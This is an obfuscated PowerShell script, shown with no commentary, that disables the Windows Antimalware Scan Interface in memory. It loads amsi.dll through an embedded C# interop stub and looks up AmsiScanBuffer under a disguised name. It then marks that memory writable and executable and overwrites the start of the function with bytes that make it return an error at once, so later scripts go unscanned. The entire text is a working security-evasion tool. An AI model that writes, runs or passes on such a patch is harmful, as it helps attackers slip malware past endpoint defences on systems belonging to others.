$K_gNl6PFOGY3BSl = @"
using System;
using System.Runtime.InteropServices;
public class K_gNl6PFOGY3BSl {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr on1BHp, string NSw);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr L539MPgd1T, UIntPtr hk47QgZ8eEyV, uint uBTbfBih5A1Dvic, out uint FcUBRon7MVG8GlfI5Ai);
}
"@

Add-Type $K_gNl6PFOGY3BSl

$Ru6BoA_QjrTYCI9 = [K_gNl6PFOGY3BSl]::LoadLibrary("$([ChAR](79+18)+[Char]([ByTe]0x6d)+[cHar]([bYte]0x73)+[cHar](105)+[cHAr](46*22/22)+[chAR]([bYte]0x64)+[CHAR]([BYtE]0x6c)+[CHAr]([bYTE]0x6c))")
$uNoKmZctI5XmK8Zny = [K_gNl6PFOGY3BSl]::GetProcAddress($Ru6BoA_QjrTYCI9, "$(('ÂmsíScâ'+'nBùffér').nORmALiZE([ChaR]([BYTE]0x46)+[CHaR]([BYTe]0x6f)+[chAr]([byTe]0x72)+[chaR]([BYtE]0x6d)+[CHaR](68+12-12)) -replace [ChAr](92)+[CHAR]([BYtE]0x70)+[chAr](114+9)+[CHAR](77*13/13)+[CHAR](110*29/29)+[chaR]([BYTE]0x7d))")
$p = 0
[K_gNl6PFOGY3BSl]::VirtualProtect($uNoKmZctI5XmK8Zny, [uint32]5, 0x40, [ref]$p)
$ZTvUjRhImbNcoDth = "0xB8"
$hdr77Eg25ntVEnKYb = "0x57"
$WSU2Z = "0x00"
$Rlf7l62HqPrWqzr = "0x07"
$fn4v9Zj0g = "0x80"
$ZRIV8JUXg_ = "0xC3"
$rmPpmKZcCOrWHs = [Byte[]] ($ZTvUjRhImbNcoDth,$hdr77Eg25ntVEnKYb,$WSU2Z,$Rlf7l62HqPrWqzr,+$fn4v9Zj0g,+$ZRIV8JUXg_)
[System.Runtime.InteropServices.Marshal]::Copy($rmPpmKZcCOrWHs, 0, $uNoKmZctI5XmK8Zny, 6)